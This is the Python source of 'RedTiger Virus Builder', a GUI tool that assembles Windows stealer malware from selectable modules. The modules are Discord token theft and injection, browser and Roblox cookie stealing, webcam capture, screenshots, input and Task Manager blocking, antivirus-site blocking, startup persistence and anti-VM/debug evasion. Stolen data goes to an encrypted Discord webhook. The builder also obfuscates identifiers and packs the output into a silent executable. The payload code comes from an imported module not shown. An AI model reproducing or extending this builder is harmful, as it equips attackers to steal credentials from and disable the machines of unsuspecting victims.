# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import customtkinter as ctk
    from tkinter import messagebox
    import tkinter
    import os
    import json
    import shutil
    import random
    import string
    import ast
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
    import base64
except Exception as e:
    ErrorModule(e)

Title("Virus Builder")

try:
    colors = {
        "white"     : "#ffffff",
        "red"       : "#a80505",
        "dark_red"  : "#800000",
        "dark_gray" : "#1e1e1e",
        "gray"      : "#444444",
        "light_gray": "#949494",
        "background": "#262626"
    }

    builder = ctk.CTk()
    builder.title(f"RedTiger {version_tool} - Virus Builder")
    builder.geometry("800x600")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))

    option_system                    = "Disable"
    option_discord                   = "Disable"
    option_discord_injection         = "Disable"
    option_browser                   = "Disable"
    option_roblox                    = "Disable"
    option_camera_capture            = "Disable"
    option_open_user_profil_settings = "Disable"
    option_screenshot                = "Disable"
    option_block_key                 = "Disable"
    option_block_mouse               = "Disable"
    option_block_task_manager        = "Disable"
    option_block_website             = "Disable"
    option_shutdown                  = "Disable"
    option_spam_open_programs        = "Disable"
    option_spam_create_files         = "Disable"
    option_fake_error                = "Disable"
    option_startup                   = "Disable"
    option_restart                   = "Disable"
    option_anti_vm_and_debug         = "Disable"
    webhook                          = "None"
    name_file                        = "None"
    icon_path                        = "None"
    file_type                        = "None"

    option_system_var                    = ctk.StringVar(value="Disable")
    option_discord_var                   = ctk.StringVar(value="Disable")
    option_discord_injection_var         = ctk.StringVar(value="Disable")
    option_browser_var                   = ctk.StringVar(value="Disable")
    option_roblox_var                    = ctk.StringVar(value="Disable")
    option_camera_capture_var            = ctk.StringVar(value="Disable")
    option_screenshot_var                = ctk.StringVar(value="Disable")
    option_open_user_profil_settings_var = ctk.StringVar(value="Disable")
    option_block_key_var                 = ctk.StringVar(value="Disable")
    option_block_mouse_var               = ctk.StringVar(value="Disable")
    option_block_task_manager_var        = ctk.StringVar(value="Disable")
    option_block_website_var             = ctk.StringVar(value="Disable")
    option_shutdown_var                  = ctk.StringVar(value="Disable")
    option_spam_open_programs_var        = ctk.StringVar(value="Disable")
    option_spam_create_files_var         = ctk.StringVar(value="Disable")
    option_fake_error_var                = ctk.StringVar(value="Disable")
    option_startup_var                   = ctk.StringVar(value="Disable")
    option_restart_var                   = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var         = ctk.StringVar(value="Disable")
    file_type_var                        = ctk.StringVar(value="File Type")
    webhook_var                          = ctk.StringVar(value="None")

    def ErrorLogs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message + white}")
        messagebox.showerror(f"RedTiger {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", message)

    def TestWebhook():
        if CheckWebhook(webhook_url.get()) == True:
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    Slow(virus_banner)
    
    title_frame = ctk.CTkFrame(builder, width=780, height=198, fg_color=colors["background"]) 
    title_frame.grid(row=1, column=0, sticky="w", pady=(10, 0), padx=(10, 0))
    title_frame.grid_propagate(False)
    title_frame.grid_columnconfigure(0, weight=1)

    title = ctk.CTkLabel(title_frame, text="Virus Builder", font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"), text_color=colors["red"])
    title.grid(row=1, pady=(10, 0), sticky="we", columnspan=3)

    text = ctk.CTkLabel(title_frame, text="The builder only creates viruses that work under Windows.", font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"])
    text.grid(row=2, pady=0, columnspan=3, sticky="we")

    url = ctk.CTkLabel(title_frame, text=github_tool, font=ctk.CTkFont(family="Helvetica", size=15))
    url.grid(row=3, pady=(3, 15), columnspan=3, sticky="we")

    webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=15), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="https://discord.com/api/webhooks/...")
    webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")

    test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, height=45, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")

    options_frame = ctk.CTkFrame(builder, width=720, height=240, fg_color=colors["dark_gray"]) 
    options_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_frame.grid_propagate(False)
    options_frame.grid_columnconfigure(0, weight=1)
    options_frame.grid_columnconfigure(1, weight=1)
    options_frame.grid_columnconfigure(2, weight=1)

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = tkinter.filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = tkinter.filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass
        
    def ToggleOpenUserprofile():
        if option_screenshot_var.get() == "Enable":
            option_open_user_profil_settings_cb.configure(state="normal", border_color=colors['red'])
        else:
            option_open_user_profil_settings_cb.configure(state="disable", border_color=colors['dark_red'])
            option_open_user_profil_settings_cb.deselect() 

    fake_error_title         = "Microsoft Excel"
    fake_error_message       = "The file is corrupt and cannot be opened."
    fake_error_window_status = True

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
            pass
        else:
            fake_error_window_status = True
            return

        fake_error_window = ctk.CTkToplevel(builder)
        fake_error_window.title(f"RedTiger {version_tool} - Fake Error")

        fake_error_window.geometry("300x210")
        fake_error_window.resizable(False, False)
        fake_error_window.configure(fg_color=colors["background"])

        fake_error_title_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Title", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_title_entry.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        fake_error_message_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Message", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_message_entry.grid(row=1, column=0, padx=20, pady=(10, 20), sticky="ew")

        def Validate():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()
            fake_error_window.destroy()
            
        validate_button = ctk.CTkButton(fake_error_window, text="Validate", command=Validate, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40, width=100)
        validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        fake_error_window.mainloop()

    option_system_cb                    = ctk.CTkCheckBox(options_frame, text="System Info",        variable=option_system_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_discord_cb                   = ctk.CTkCheckBox(options_frame, text="Discord Token",      variable=option_discord_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_discord_injection_cb         = ctk.CTkCheckBox(options_frame, text="Discord Injection",  variable=option_discord_injection_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_browser_cb                   = ctk.CTkCheckBox(options_frame, text="Browser Steal",      variable=option_browser_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_roblox_cb                    = ctk.CTkCheckBox(options_frame, text="Roblox Cookie",      variable=option_roblox_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_camera_capture_cb            = ctk.CTkCheckBox(options_frame, text="Camera Capture",     variable=option_camera_capture_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_screenshot_cb                = ctk.CTkCheckBox(options_frame, text="Screenshot",         variable=option_screenshot_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), command=ToggleOpenUserprofile)
    option_open_user_profil_settings_cb = ctk.CTkCheckBox(options_frame, text="Open UserProfile",   variable=option_open_user_profil_settings_var, onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=15), state="disable")
    option_block_key_cb                 = ctk.CTkCheckBox(options_frame, text="Block Key",          variable=option_block_key_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_block_mouse_cb               = ctk.CTkCheckBox(options_frame, text="Block Mouse",        variable=option_block_mouse_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_block_task_manager_cb        = ctk.CTkCheckBox(options_frame, text="Block Task Manager", variable=option_block_task_manager_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_block_website_cb             = ctk.CTkCheckBox(options_frame, text="Block AV Website",   variable=option_block_website_var,             onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_shutdown_cb                  = ctk.CTkCheckBox(options_frame, text="Shutdown",           variable=option_shutdown_var,                  onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_spam_open_programs_cb        = ctk.CTkCheckBox(options_frame, text="Spam Open Program",  variable=option_spam_open_programs_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_spam_create_files_cb         = ctk.CTkCheckBox(options_frame, text="Spam Create File",   variable=option_spam_create_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_fake_error_cb                = ctk.CTkCheckBox(options_frame, text="Fake Error",         variable=option_fake_error_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), command=CreateFakeErrorWindow)
    option_startup_cb                   = ctk.CTkCheckBox(options_frame, text="Launch at Startup",  variable=option_startup_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_restart_cb                   = ctk.CTkCheckBox(options_frame, text="Restart Every 5min", variable=option_restart_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
    option_anti_vm_and_debug_cb         = ctk.CTkCheckBox(options_frame, text="Anti VM & Debug",    variable=option_anti_vm_and_debug_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15))
 
    option_system_cb.grid(                   row=4,  column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_discord_cb.grid(                  row=5,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_discord_injection_cb.grid(        row=6,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_browser_cb.grid(                  row=7,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_roblox_cb.grid(                   row=8,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_camera_capture_cb.grid(           row=9,  column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_screenshot_cb.grid(               row=10, column=0, padx=(60, 0), pady=3,      sticky="nswe")

    option_open_user_profil_settings_cb.grid(row=4, column=1, padx=(0, 0), pady=(18,3),   sticky="nswe")
    option_block_key_cb.grid(                row=5, column=1, padx=(0, 0), pady=3,        sticky="nswe")
    option_block_mouse_cb.grid(              row=6, column=1, padx=(0, 0), pady=3,        sticky="nswe")
    option_block_task_manager_cb.grid(       row=7, column=1, padx=(0, 0), pady=3,        sticky="nswe")
    option_block_website_cb.grid(            row=8, column=1, padx=(0, 0), pady=3,        sticky="nswe")
    option_shutdown_cb.grid(                 row=9, column=1, padx=(0, 0), pady=3,        sticky="nswe")

    option_spam_open_programs_cb.grid(       row=4, column=2, padx=(0, 0), pady=(18,3),   sticky="nswe")
    option_spam_create_files_cb.grid(        row=5, column=2, padx=(0, 0), pady=3,        sticky="nswe")
    option_fake_error_cb.grid(               row=6, column=2, padx=(0, 0), pady=3,        sticky="nswe")
    option_startup_cb.grid(                  row=7, column=2, padx=(0, 0), pady=3,        sticky="nswe")
    option_restart_cb.grid(                  row=8, column=2, padx=(0, 0), pady=3,        sticky="nswe")
    option_anti_vm_and_debug_cb.grid(        row=9, column=2, padx=(0, 0), pady=3,        sticky="nswe")

    build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
    build_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    build_frame.grid_propagate(False)
    build_frame.grid_columnconfigure(0, weight=1)
    build_frame.grid_columnconfigure(1, weight=1)
    build_frame.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(build_frame, height=30, width=140, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=12), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=1, column=0, padx=0, sticky="w", pady=0)

    def FileTypeChanged(*args):
        if file_type_var.get() == "Python File":
            icon_button.configure(state="disabled")
        elif file_type_var.get() == "File Type":
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(build_frame, height=30, width=140, font=ctk.CTkFont(family="Helvetica", size=12), variable=file_type_var, values=["Python File", "Exe File"], fg_color=colors['dark_gray'], button_color=colors["red"], button_hover_color=colors['dark_red'])
    file_type_menu.grid(row=1, column=2, sticky="w", padx=0, pady=0)

    icon_button = ctk.CTkButton(build_frame, height=30, width=140, text="Select Icon", command=ChooseIcon, fg_color=colors["red"], hover_color=colors["dark_red"], text_color_disabled=colors["light_gray"])
    icon_button.grid(row=1, column=2, sticky="e", padx=0, pady=0)
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", lambda *args: FileTypeChanged())

    build_frame.grid_columnconfigure(0, minsize=0)

    def BuildSettings():
        global option_system, option_discord, option_discord_injection, option_browser, option_roblox, option_camera_capture, option_open_user_profil_settings, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown ,option_fake_error,  option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
        option_system                    = option_system_var.get()
        option_discord                   = option_discord_var.get()
        option_discord_injection         = option_discord_injection_var.get()
        option_browser                   = option_browser_var.get()
        option_roblox                    = option_roblox_var.get()
        option_camera_capture            = option_camera_capture_var.get()
        option_open_user_profil_settings = option_open_user_profil_settings_var.get()
        option_screenshot                = option_screenshot_var.get()
        option_block_website             = option_block_website_var.get()
        option_block_key                 = option_block_key_var.get()
        option_block_mouse               = option_block_mouse_var.get()
        option_block_task_manager        = option_block_task_manager_var.get()
        option_shutdown                  = option_shutdown_var.get()
        option_spam_open_programs        = option_spam_open_programs_var.get()
        option_spam_create_files         = option_spam_create_files_var.get()
        option_fake_error                = option_fake_error_var.get()
        option_startup                   = option_startup_var.get()
        option_restart                   = option_restart_var.get()
        option_anti_vm_and_debug         = option_anti_vm_and_debug_var.get()
        webhook                          = webhook_url.get()
        name_file                        = name_file_entry.get()
        file_type                        = file_type_var.get()

        if not webhook.strip():
            ErrorLogs("Please enter the webhook.")
            return
        
        if not name_file.strip():
            ErrorLogs("Please choose the file name.")
            return
        
        if file_type == "File Type":
            ErrorLogs("Please choose the file type.")
            return
        
        builder.quit()
        builder.destroy()

    build = ctk.CTkButton(builder, text="Build", command=BuildSettings, height=40, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    build.grid(row=5, column=0, padx=330, pady=30, sticky="nswe")

    builder.mainloop()

    if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
        ErrorLogs("You have closed the page, so your virus will not be built.")
        Continue()
        Reset()

    print(f"""
    {option_system           } System Info         {option_open_user_profil_settings} Open UserProfil     {option_spam_open_programs} Spam Open Program
    {option_discord          } Discord Token       {option_block_key                } Block Key           {option_spam_create_files } Spam Create File
    {option_discord_injection} Discord Injection   {option_block_mouse              } Block Mouse         {option_fake_error        } Fake Error
    {option_browser          } Browser Steal       {option_block_task_manager       } Block Task Manager  {option_startup           } Launch at Startup
    {option_roblox           } Roblox Cookie       {option_block_website            } Block AV Website    {option_restart           } Restart Every 5min
    {option_camera_capture   } Camera Capture      {option_shutdown                 } Shutdown            {option_anti_vm_and_debug } Anti VM & Debug
    {option_screenshot       } Screenshot
    """.replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))

    if option_fake_error == "Enable":
        print(f"""{red}Fake Error Title   : {white + fake_error_title}
{red}Fake Error Message : {white + fake_error_message}""")

    print(f"""{red}Webhook   : {white + webhook[:90] + '..'}
{red}File Type : {white + file_type}
{red}File Name : {white + name_file}""")

    if icon_path:
        if 100 < len(icon_path):
            icon_path_cut = icon_path[:100] + '..'
        else:
            icon_path_cut = icon_path
        print(f"{red}Icon Path : {white + icon_path_cut}")
    else:
        ErrorLogs("Please choose the file type.")
        Continue()
        Reset()
    
    def Encryption(webhook):
        def Encrypt(decrypted, key):
            def DeriveKey(password, salt):
                kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
                if isinstance(password, str):  
                    password = password.encode()  
                return kdf.derive(password)
            
            salt = os.urandom(16)
            derived_key = DeriveKey(key, salt)
            iv = os.urandom(16)
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(decrypted.encode()) + padder.finalize()
            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            encrypted_message = salt + iv + encrypted_data
            return base64.b64encode(encrypted_message).decode()
        
        key_encryption = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100,200)))
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Encryption key created: {white + key_encryption[:75] + '..'}")
        webhook_encrypted = Encrypt(webhook, key_encryption)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Encrypted webhook: {white + webhook_encrypted[:75] + '..'}")

        return key_encryption, webhook_encrypted
    
    def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
        if file_type in ["Exe File", "Python File"]:
            try:

                with open(file_python, 'w', encoding='utf-8') as file:

                    if option_anti_vm_and_debug == 'Enable':
                        file.write(Ant1VM4ndD3bug)

                    file.write(Obligatory.replace("%WEBHOOK_URL%", webhook_encrypted).replace("%KEY%", key_encryption).replace("%LINK_AVATAR%", avatar_webhook).replace("%LINK_GITHUB%", github_tool).replace("%LINK_WEBSITE%", website))

                    if option_system == 'Enable':
                        file.write(Sy5t3mInf0)

                    if option_discord == 'Enable':
                        file.write(Di5c0rdT0k3n)

                    if option_discord_injection == 'Enable':
                        file.write(Di5c0rdIj3ct10n)

                    if option_browser == 'Enable':
                        file.write(Br0w53r5t341)

                    if option_roblox == 'Enable':
                        file.write(R0b10xC00ki3)

                    if option_camera_capture == 'Enable':
                        file.write(C4m3r4C4ptur3)

                    if option_open_user_profil_settings == 'Enable':
                        file.write(Op3nU53rPr0fi1353tting5)

                    if option_screenshot == 'Enable':
                        file.write(Scr33n5h0t)

                    if option_block_key == 'Enable':
                        file.write(B10ckK3y)

                    if option_block_mouse == 'Enable':
                        file.write(B10ckM0u53)

                    if option_block_task_manager == 'Enable':
                        file.write(B10ckT45kM4n4g3r)

                    if option_block_website == 'Enable':
                        file.write(B10ckW3b5it3)

                    if option_fake_error == 'Enable':
                        file.write(F4k33rr0r(fake_error_title, fake_error_message))

                    if option_spam_open_programs == 'Enable':
                        file.write(Sp4m0p3nPr0gr4m)

                    if option_spam_create_files == 'Enable':
                        file.write(Sp4mCr34tFil3)

                    if option_shutdown == 'Enable':
                        file.write(Shutd0wn)

                    if option_startup == 'Enable':
                        file.write(St4rtup)

                    if option_spam_open_programs == 'Enable' or option_block_mouse == 'Enable' or option_spam_create_files == 'Enable':
                        file.write(Sp4mOpti0ns)

                    if option_restart == 'Enable':
                        file.write(R3st4rt)

                    file.write(St4rt)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
            except Exception as e:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
                Continue()
                Reset()

    def PythonIdentifierObfuscation(file_python):
        if file_type in ["Exe File", "Python File"]:
            try:
                variable_map = {}

                def RandomName():
                    return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50,100)))

                with open(file_python, 'r', encoding='utf-8') as file:
                    original_script = file.read()

                tree = ast.parse(original_script)

                def visit_node(node):
                    if isinstance(node, ast.Assign):
                        for target in node.targets:
                            if isinstance(target, ast.Name):
                                var_name = target.id
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    target.id = new_name
                                return

                    elif isinstance(node, ast.FunctionDef):
                        for arg in node.args.args:
                            var_name = arg.arg
                            if var_name not in variable_map and "v4r_" in var_name:
                                new_name = RandomName()
                                variable_map[var_name] = new_name
                                arg.arg = new_name
                            return

                    elif isinstance(node, ast.ClassDef):
                        var_name = node.name
                        if var_name not in variable_map and "v4r_" in var_name:
                            new_name = RandomName()
                            variable_map[var_name] = new_name
                            node.name = new_name
                        return
                
                    for child in ast.iter_child_nodes(node):
                        visit_node(child)
                
                visit_node(tree)

                with open(file_python, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                with open(file_python, 'w', encoding='utf-8') as file:
                    for line in lines:
                        for var_name, new_name in variable_map.items():
                            if var_name in line:
                                line = line.replace(var_name, new_name)
                        file.write(line)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All the Identifiers of the python file were obfuscated.")
            except Exception as e:
                input(e)

    def SendWebhook(webhook):
        try:
            fields = [
                {"name": f"File Name:",          "value": f"""```{name_file}```""",                        "inline": True},
                {"name": f"File Type:",          "value": f"""```{file_type}```""",                        "inline": True},
                {"name": f"System Info:",        "value": f"""```{option_system}```""",                    "inline": True},
                {"name": f"Discord Token:",      "value": f"""```{option_discord}```""",                   "inline": True},
                {"name": f"Discord Injection:",  "value": f"""```{option_discord_injection}```""",         "inline": True},
                {"name": f"Browser Steal:",      "value": f"""```{option_browser}```""",                   "inline": True},
                {"name": f"Roblox Cookie:",      "value": f"""```{option_roblox}```""",                    "inline": True},
                {"name": f"Camera Capture:",     "value": f"""```{option_camera_capture}```""",            "inline": True},
                {"name": f"Screenshot:",         "value": f"""```{option_screenshot}```""",                "inline": True},
                {"name": f"Open UserProfil:",    "value": f"""```{option_open_user_profil_settings}```""", "inline": True},
                {"name": f"Block Key:",          "value": f"""```{option_block_key}```""",                 "inline": True},
                {"name": f"Block Mouse:",        "value": f"""```{option_block_mouse}```""",               "inline": True},
                {"name": f"Block Task Manager:", "value": f"""```{option_block_task_manager}```""",        "inline": True},
                {"name": f"Block AV Website:",   "value": f"""```{option_block_website}```""",             "inline": True},
                {"name": f"Shutdown:",           "value": f"""```{option_shutdown}```""",                  "inline": True},
                {"name": f"Spam Open Program:",  "value": f"""```{option_spam_open_programs}```""",        "inline": True},
                {"name": f"Spam Create File:",   "value": f"""```{option_spam_create_files}```""",         "inline": True},
                {"name": f"Fake Error:",         "value": f"""```{option_fake_error}```""",                "inline": True},
                {"name": f"Launch At Startup:",  "value": f"""```{option_startup}```""",                   "inline": True},
                {"name": f"Restart Every 5min:", "value": f"""```{option_restart}```""",                   "inline": True},
                {"name": f"Anti VM & Debug:",    "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
                {"name": f"Webhook:",            "value": f"""{webhook}""",                                "inline": True},
            ]

            embed = {
                'title': f'Virus Created:',
                'color': color_webhook,
                "fields": fields,
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                }
            
            response = requests.post(webhook, data=json.dumps({
                'embeds': [embed],
                'username': username_webhook,
                'avatar_url': avatar_webhook
                }), headers={'Content-Type': 'application/json'})

        except: pass
        
    def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        if sys.platform.startswith("win"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python", "-m", "pip", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif sys.platform.startswith("linux"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")

        try:
            script_path = os.path.abspath(file_python)
            working_directory = os.path.dirname(script_path)
            os.chdir(working_directory)

            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]

            if icon_path:
                pyinstaller.extend(['--icon', icon_path])

            result = subprocess.run(pyinstaller, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.stderr:
                if "completed successfully" not in result.stderr:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + result.stderr}")
                    Continue()
                    Reset()
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
        
            
            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                shutil.rmtree(os.path.join(working_directory, "build"))
                os.remove(os.path.join(working_directory, f"{name_file}.spec"))
                os.remove(file_python)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + str(e)}")
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + str(e)}")
            Continue()
            Reset()

    file_python_relative = f'1-Output\\VirusBuilder\\{name_file}.py'
    file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")

    path_destination_relative = "1-Output\\VirusBuilder"
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

    # File detected by the antivirus, but be aware that there is no backdoor
    from FileDetectedByAntivirus.VirusBuilderOptions import *

    key_encryption, webhook_encrypted = Encryption(webhook)
    PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
    PythonIdentifierObfuscation(file_python)

    if file_type == "Exe File":
        if not os.path.exists(path_destination):
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, reinstall the tool and try again.")
            Continue()
            Reset()
        
        if os.path.exists(file_python):
            if not os.path.exists(icon_path):
                ConvertToExe(file_python, path_destination, name_file)
